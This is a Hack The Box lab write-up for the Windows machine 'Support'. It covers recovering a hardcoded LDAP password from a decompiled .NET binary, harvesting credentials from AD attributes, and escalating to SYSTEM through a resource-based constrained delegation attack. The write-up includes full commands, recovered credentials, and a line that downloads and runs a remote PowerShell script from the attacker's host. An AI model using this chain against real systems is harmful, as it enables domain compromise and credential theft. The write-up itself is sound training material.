# Support: Hack The Box Writeup

**Machine:** Support  
**OS:** Windows  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** March 2026  

---

## Summary

Support is an easy Windows machine built around an Active Directory environment. The attack chain begins with anonymous SMB access to a non-standard share containing a custom .NET utility. Decompiling the binary reveals an obfuscated LDAP password, which is recovered by replicating the decryption logic in Python. Those credentials allow LDAP enumeration of the domain, where a plaintext password is found stored in a user account's `info` attribute. That user has WinRM access, granting initial foothold. Privilege escalation abuses a `GenericAll` ACE that the user's group holds over the Domain Controller computer object, enabling a full Resource-Based Constrained Delegation (RBCD) attack to impersonate the Administrator and obtain a SYSTEM shell.

**Key techniques:** SMB enumeration · .NET binary decompilation · Custom decryption (XOR/Base64) · LDAP enumeration · Credential harvesting from AD attributes · WinRM access · ACL abuse · Resource-Based Constrained Delegation (RBCD) · Kerberos ticket impersonation

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.230.181
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

The port profile is immediately recognisable as a Domain Controller: DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), and WinRM (5985). The domain is `support.htb`. Add it to the hosts file:

```bash
sudo sh -c 'echo "10.129.230.181 support.htb DC.support.htb" >> /etc/hosts'
```

---

## Enumeration

### SMB: Anonymous and Guest Access

Check available shares with guest credentials:

```bash
netexec smb 10.129.230.181 -u guest -p '' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
support-tools   READ            support staff tools
SYSVOL                          Logon server share
```

`support-tools` stands out: it is a non-standard share with guest read access. Everything else is a default Windows share. Connecting to it:

```bash
smbclient //10.129.230.181/support-tools -U "guest" -p ''
```

```
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe   A 44398000  Sat May 28 07:19:43 2022
```

Most files are well-known third-party tools: 7-Zip, Notepad++, PuTTY, Sysinternals, WinDirStat, Wireshark. All dated May 2022. `UserInfo.exe.zip` is different: it is a custom binary, named after the domain's purpose ("support"), and was added in July 2022: a month after the rest. That is the target. Download everything and unzip it:

```bash
# Inside smbclient
get UserInfo.exe.zip

# Back in shell
unzip UserInfo.exe.zip
```

This extracts `UserInfo.exe`, `UserInfo.exe.config`, and a set of .NET dependency DLLs. The config file reveals the runtime:

```xml
<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
```

.NET Framework 4.8: this binary compiles to MSIL (Microsoft Intermediate Language), which means it is trivially decompilable back to near-original C# source code.

---

## .NET Binary Analysis: Recovering the LDAP Credential

### Decompilation with ILSpy

Install `ilspycmd` (compatible version for dotnet 6):

```bash
dotnet tool install ilspycmd -g --version 7.2.1.416
~/.dotnet/tools/ilspycmd UserInfo.exe
```

The decompiled source reveals two key namespaces. In `UserInfo.Services`, the `Protected` class contains hardcoded credentials:

```csharp
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

And the `LdapQuery` constructor shows exactly how it is used:

```csharp
string password = Protected.getPassword();
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

The binary connects to LDAP as `support\ldap` using a password that is Base64-decoded then XOR'd against the key `armando` and `0xDF`. The decryption logic is straightforward to replicate.

### Decrypting the Password

```bash
# On python
```
```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

array = base64.b64decode(enc_password)
result = bytes([(b ^ key[i % len(key)]) ^ 0xDF for i, b in enumerate(array)])
print(result.decode())
```

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Credential recovered: `support\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

Verify it works:

```bash
netexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
# [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## LDAP Enumeration: Password in User Attribute

With valid LDAP credentials, enumerate all user objects and check their `description` and `info` fields: these are rarely monitored and commonly abused to store passwords in misconfigured AD environments:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D "support\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" \
  "(objectClass=user)" \
  sAMAccountName description info
```

One entry stands out immediately:

```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
sAMAccountName: support
```

The `support` user has a plaintext password stored in the `info` attribute. This is a textbook AD misconfiguration: the `info` field is readable by any authenticated domain user and is never treated as sensitive.

---

## Initial Access: WinRM as support

Port 5985 (WinRM) was open in the nmap scan. Test the credential:

```bash
netexec winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful' -d support.htb
# [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

`Pwn3d!` confirms WinRM access. Get a shell:

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support

*Evil-WinRM* PS C:\Users\support\Documents> type C:\Users\support\Desktop\user.txt
fbcaf3ff6001a9ada4dd91974b70de9d
```

---

## Privilege Escalation: GenericAll → RBCD → SYSTEM

### Enumeration: Group Memberships and ACLs

Check the `support` user's group memberships:

```powershell
whoami /groups
```

The non-default group is `SUPPORT\Shared Support Accounts`. Check what ACLs this group holds on the DC computer object:

```powershell
(Get-ACL "AD:$(Get-ADComputer DC | Select-Object -ExpandProperty DistinguishedName)").Access `
  | Where-Object {$_.IdentityReference -like "*Shared*"}
```

```
ActiveDirectoryRights : GenericAll
InheritanceType       : All
AccessControlType     : Allow
IdentityReference     : SUPPORT\Shared Support Accounts
```

`GenericAll` over the DC computer object is full control: equivalent to being able to write any attribute on it. This enables **Resource-Based Constrained Delegation (RBCD) abuse**.

### RBCD Attack: Overview

RBCD allows a computer account to impersonate any user when authenticating to a service. The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a computer object controls which accounts can delegate to it. With `GenericAll`, we can write this attribute ourselves. The attack:

1. Create a fake computer account we control
2. Write its SID into the DC's delegation attribute
3. Use S4U2Proxy to get a Kerberos ticket impersonating Administrator for the DC's CIFS service
4. Use that ticket to get a shell

### Step 1: Create a Fake Computer Account

Load Powermad (served from Kali) and create the account:

```powershell
# On Kali: python3 -m http.server 80
iex(iwr -UseBasicParsing http://10.10.15.12/Powermad.ps1)

New-MachineAccount -MachineAccount fakemachine -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
# [+] Machine account fakemachine added
```

### Step 2: Write the RBCD Attribute

```powershell
$fakeSID = Get-ADComputer fakemachine | Select-Object -ExpandProperty SID

$SD = New-Object Security.AccessControl.RawSecurityDescriptor `
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakeSID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-ADComputer DC | Set-ADComputer -Replace @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Verify the attribute was written:

```powershell
Get-ADComputer DC -Properties msds-allowedtoactonbehalfofotheridentity `
  | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
```

```
Path  Owner                  Access
----  -----                  ------
      BUILTIN\Administrators SUPPORT\fakemachine$ Allow
```

### Step 3: Request a Ticket Impersonating Administrator

From Kali, use impacket's `getST` to perform the S4U2Proxy exchange:

```bash
impacket-getST -spn cifs/DC.support.htb \
  -impersonate Administrator \
  -dc-ip 10.129.230.181 \
  'support.htb/fakemachine$:Password123!'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

### Step 4: Use the Ticket to Get a Shell

```bash
export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache

impacket-psexec -k -no-pass DC.support.htb
```

```
[*] Found writable share ADMIN$
[*] Uploading file boySGkaE.exe
[*] Creating service YMIe on DC.support.htb.....
[*] Starting service YMIe.....

Microsoft Windows [Version 10.0.20348.859]
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
# 63c37605f18b2d3103d2126ed7cec996
```

---

<!-- Completion Image Here -->
<img width="1196" height="679" alt="Screenshot 2026-04-28 103842" src="https://github.com/user-attachments/assets/f71eabdd-14fe-4941-a9cd-5398d3884a15" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| Guest-readable non-standard SMB share | `support-tools` share | Access to internal tooling including custom binary |
| Hardcoded obfuscated credential in .NET binary | `UserInfo.exe`: `Protected` class | LDAP service account password recovered via decompilation |
| Weak credential obfuscation (XOR/Base64) | `Protected.getPassword()` | Trivially reversible: not encryption |
| Cleartext password in AD user `info` attribute | `support` user object | Domain user credential exposed to any authenticated LDAP query |
| GenericAll ACE on DC computer object | `Shared Support Accounts` group | Full RBCD attack path to SYSTEM |
| Resource-Based Constrained Delegation abuse | DC computer object | Kerberos ticket impersonating Administrator |

---

## Key Takeaways

- **.NET binaries are not protected by compilation**: MSIL decompiles to near-original C# source code in seconds. Hardcoded credentials in .NET apps are trivially extracted
- **XOR obfuscation is not encryption**: the key was stored in the same binary as the ciphertext. Any obfuscation scheme where the key ships with the payload provides no real security
- **LDAP attribute abuse is underrated**: the `info`, `description`, and `comment` fields on AD user objects are readable by all authenticated users and never appear in standard password audits. Always enumerate them
- **ACL misconfigurations are the most common AD privesc path**: `GenericAll` on a computer object grants enough control to fully compromise the domain. BloodHound or manual ACL queries should always be part of AD enumeration
- **RBCD is a powerful and stealthy attack**: it requires no code execution on the DC, uses legitimate Kerberos mechanisms, and leaves minimal forensic trace compared to DCSync or pass-the-hash attacks
- **Always check WinRM (5985)**: on Windows machines with domain credentials, it is often the cleanest initial foothold

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
